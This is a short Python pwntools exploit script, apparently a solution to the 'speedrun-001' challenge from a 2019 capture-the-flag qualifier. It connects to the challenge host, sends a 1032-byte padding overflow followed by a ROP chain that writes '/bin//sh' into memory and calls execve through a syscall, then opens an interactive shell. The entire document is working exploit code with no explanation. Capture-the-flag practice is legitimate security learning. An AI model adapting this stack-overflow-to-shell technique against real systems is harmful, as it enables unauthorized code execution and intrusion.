from pwn import *

local = False

if local:
    io = process('./speedrun-001')
    context.terminal = ['tmux', 'sp', '-h']
    gdb.attach(io)
    context.log_level = 'debug'
else:
    io = remote('speedrun-001.quals2019.oooverflow.io', 31337)

SYSCALL = 0x0000000000474e65
POP_RAX = 0x0000000000415664
POP_RDX = 0x00000000004498b5 # pop rdx ; ret
MOV_RAX_TO_RDI = 0x000000000047b6e4 # : mov qword ptr [rdi + 0x300], rax ; ret
POP_RDI = 0x0000000000400686 # : pop rdi ; ret
PUSH_RDI = 0x00000000004236a5 # : push rdi ; ret
POP_RSI = 0x00000000004101f3 # : pop rsi ; ret
MOV_RAX_TO_RSI = 0x000000000047f471 #: mov qword ptr [rsi], rax ; ret   

payload = "A"*1032
payload += p64(POP_RDI)
payload += p64(0x6bb2e0-0x300)
payload += p64(POP_RAX)
payload += p64(0x68732f2f6e69622f)
payload += p64(MOV_RAX_TO_RDI)
payload += p64(POP_RDX)
payload += p64(0)
payload += p64(POP_RDI)
payload += p64(0x6bb2e0)
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(POP_RAX)
payload += p64(59)
payload += p64(SYSCALL)


io.sendlineafter('Any last words?\n', payload)
io.interactive()
